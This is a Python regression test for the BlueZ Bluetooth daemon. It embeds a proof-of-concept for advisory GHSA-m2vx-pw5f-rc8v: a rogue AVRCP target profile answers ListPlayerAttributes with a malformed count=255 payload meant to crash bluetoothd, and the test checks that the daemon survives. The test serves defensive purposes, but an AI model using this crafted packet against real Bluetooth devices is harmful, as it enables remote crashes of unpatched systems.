# -*- coding: utf-8; mode: python; eval: (blacken-mode); -*-
# SPDX-License-Identifier: LGPL-2.1-or-later
import uuid
import threading
import time
import select
import os
import subprocess
import struct

import pytest
import dbus

from pytest_bluezenv import (
    host_config,
    Bluetoothd,
    Agent,
    wait_until,
    mainloop_wrap,
    get_dbus,
    HostPlugin,
)


class CheckAvrcpCrash_GHSA_m2vx_pw5f_rc8v(HostPlugin):
    name = "avrcp_crash"

    @mainloop_wrap
    def setup(self, impl):
        self.bus = get_dbus()
        self.profile = check_avrcp_GHSA_m2vx_pw5f_rc8v(self.bus)
        print("[*] waiting for victim AVRCP connection", flush=True)

    def wait_done(self):
        return self.profile.wait_done()


@host_config(
    [Agent()],
    [
        Bluetoothd(args=("-d", "-P", "avrcp")),
        CheckAvrcpCrash_GHSA_m2vx_pw5f_rc8v(),
        Agent(),
    ],
)
def test_avrcp_GHSA_m2vx_pw5f_rc8v(paired_hosts_bredr):
    client, server = paired_hosts_bredr

    client.agent.device_method(
        server.bdaddr, "ConnectProfile", "0000110c-0000-1000-8000-00805f9b34fb"
    )
    client.agent.expect("org.bluez.Device1.ConnectProfile:reply")

    assert server.avrcp_crash.wait_done()

    # Bluetoothd shall not have crashed, and still respond
    client.agent.device_method(server.bdaddr, "Disconnect")
    client.agent.expect("org.bluez.Device1.Disconnect:reply")


def check_avrcp_GHSA_m2vx_pw5f_rc8v(bus):
    """NN-2026-0145 AVRCP PoC. BlueZ supplies the accepted AVCTP file
    descriptor through Profile1.NewConnection.

    """

    PSM_AVCTP = 0x17
    AVC_PID = 0x110E
    AVCTP_COMMAND = 0
    AVCTP_RESPONSE = 1
    AVC_CTYPE_ACCEPTED = 0x09
    AVC_CTYPE_STABLE = 0x0C
    AVC_OP_VENDORDEP = 0x00
    AVC_SUBUNIT_PANEL = 0x09

    PDU_GET_CAPABILITIES = 0x10
    PDU_LIST_PLAYER_ATTRS = 0x11
    PDU_GET_CURRENT_PLAYER_VALUE = 0x13
    PDU_REGISTER_NOTIFICATION = 0x31
    CAP_EVENTS_SUPPORTED = 0x03
    EVENT_TRACK_CHANGED = 0x02
    COMPANY_BTSIG = b"\x00\x19\x58"

    SDP_TG_RECORD = """<?xml version="1.0" encoding="UTF-8" ?>
    <record>
      <attribute id="0x0001">
        <sequence><uuid value="0x110c"/><uuid value="0x110e"/></sequence>
      </attribute>
      <attribute id="0x0004">
        <sequence>
          <sequence><uuid value="0x0100"/><uint16 value="0x0017"/></sequence>
          <sequence><uuid value="0x0017"/><uint16 value="0x0104"/></sequence>
        </sequence>
      </attribute>
      <attribute id="0x0009">
        <sequence><sequence><uuid value="0x110e"/><uint16 value="0x0104"/></sequence></sequence>
      </attribute>
      <attribute id="0x0311"><uint16 value="0x0011"/></attribute>
    </record>
    """

    def hexdump(data):
        if data is None:
            return "<None>"
        return " ".join("%02x" % byte for byte in data)

    def send_all(fd, data):
        view = memoryview(data)
        while view:
            count = os.write(fd, view)
            if count <= 0:
                raise OSError("AVCTP write made no progress")
            view = view[count:]

    def recv_one(fd):
        readable, _, _ = select.select([fd], [], [], None)
        if readable:
            try:
                return os.read(fd, 1024)
            except OSError:
                return None
        return None

    def avctp_header(transaction, command_response):
        return bytes([(transaction << 4) | (command_response << 1)]) + struct.pack(
            ">H", AVC_PID
        )

    def avc_frame(ctype, payload):
        return bytes([ctype & 0x0F, AVC_SUBUNIT_PANEL << 3, AVC_OP_VENDORDEP]) + payload

    def avrcp_pdu(pdu_id, params, packet_type=0):
        return (
            COMPANY_BTSIG
            + bytes([pdu_id, packet_type])
            + struct.pack(">H", len(params))
            + params
        )

    def parse_avctp(data):
        if len(data) < 3:
            return None
        return (data[0] >> 4, (data[0] >> 1) & 1, data[3:])

    def parse_vendor(payload):
        if len(payload) < 10 or payload[2] != AVC_OP_VENDORDEP:
            return None
        pdu_id = payload[6]
        length = struct.unpack(">H", payload[8:10])[0]
        return payload[0] & 0x0F, pdu_id, payload[10 : 10 + length]

    class AvrcpTarget:
        def __init__(self):
            self.fd = -1
            self.event = threading.Event()

        def response(self, transaction, ctype, pdu):
            frame = avctp_header(transaction, AVCTP_RESPONSE) + avc_frame(ctype, pdu)
            print("-> " + hexdump(frame), flush=True)
            send_all(self.fd, frame)

        def loop(self):
            while self.fd >= 0:
                data = recv_one(self.fd)
                if data == b"":
                    print("[*] peer closed AVCTP", flush=True)
                    return

                print("<- " + hexdump(data), flush=True)
                header = parse_avctp(data)
                if not header:
                    continue
                transaction, command_response, payload = header
                if command_response != AVCTP_COMMAND:
                    continue

                vendor = parse_vendor(payload)
                if not vendor:
                    send_all(
                        self.fd,
                        avctp_header(transaction, AVCTP_RESPONSE)
                        + bytes([AVC_CTYPE_ACCEPTED])
                        + payload[1:],
                    )
                    continue

                _, pdu_id, params = vendor
                if pdu_id == PDU_GET_CAPABILITIES:
                    caps = bytes([CAP_EVENTS_SUPPORTED, 1, EVENT_TRACK_CHANGED])
                    self.response(
                        transaction,
                        AVC_CTYPE_STABLE,
                        avrcp_pdu(PDU_GET_CAPABILITIES, caps),
                    )
                elif pdu_id == PDU_LIST_PLAYER_ATTRS:
                    evil = bytes([0xFF]) + bytes(
                        (index % 4) + 1 for index in range(255)
                    )
                    print(
                        "[+] answering ListPlayerAttributes with count=255", flush=True
                    )
                    self.response(
                        transaction,
                        AVC_CTYPE_STABLE,
                        avrcp_pdu(PDU_LIST_PLAYER_ATTRS, evil),
                    )

                    self.event.set()
                elif pdu_id == PDU_GET_CURRENT_PLAYER_VALUE:
                    print(
                        "[+] received current-player-value data: %s" % hexdump(params),
                        flush=True,
                    )
                elif pdu_id == PDU_REGISTER_NOTIFICATION:
                    print("[*] RegisterNotification: %s" % hexdump(params), flush=True)
                else:
                    self.response(transaction, 0x0A, avrcp_pdu(pdu_id, b"\x00"))

    class Profile(dbus.service.Object):
        def __init__(self, bus, path, target):
            super().__init__(bus, path)
            self.target = target
            self.fd = -1

        @dbus.service.method("org.bluez.Profile1", in_signature="", out_signature="")
        def Release(self):
            self.close()

        @dbus.service.method("org.bluez.Profile1", in_signature="", out_signature="")
        def Cancel(self):
            pass

        @dbus.service.method(
            "org.bluez.Profile1", in_signature="oha{sv}", out_signature=""
        )
        def NewConnection(self, device, fd, properties):
            self.close()
            self.fd = fd.take()
            os.set_blocking(self.fd, True)
            self.target.fd = self.fd
            print("[+] AVRCP connection from %s" % device, flush=True)
            threading.Thread(target=self.target.loop, daemon=True).start()

        @dbus.service.method("org.bluez.Profile1", in_signature="o", out_signature="")
        def RequestDisconnection(self, device):
            self.close()

        def wait_done(self):
            return self.target.event.wait()

        def close(self):
            if self.fd >= 0:
                try:
                    os.close(self.fd)
                except OSError:
                    pass
                self.fd = -1
                self.target.fd = -1

    def register_profile(bus, target):
        profile = Profile(bus, "/bluez_poc/nn20260145", target)
        manager = dbus.Interface(
            bus.get_object("org.bluez", "/org/bluez"), "org.bluez.ProfileManager1"
        )
        options = {
            "ServiceRecord": dbus.String(SDP_TG_RECORD),
            "Role": dbus.String("server"),
            "PSM": dbus.UInt16(PSM_AVCTP),
            "RequireAuthentication": dbus.Boolean(False),
            "RequireAuthorization": dbus.Boolean(False),
        }
        manager.RegisterProfile(
            dbus.ObjectPath("/bluez_poc/nn20260145"),
            dbus.String(str(uuid.uuid4())),
            options,
        )
        print("[+] AVRCP Target profile registered on PSM 0x17", flush=True)
        return profile

    target = AvrcpTarget()
    return register_profile(bus, target)
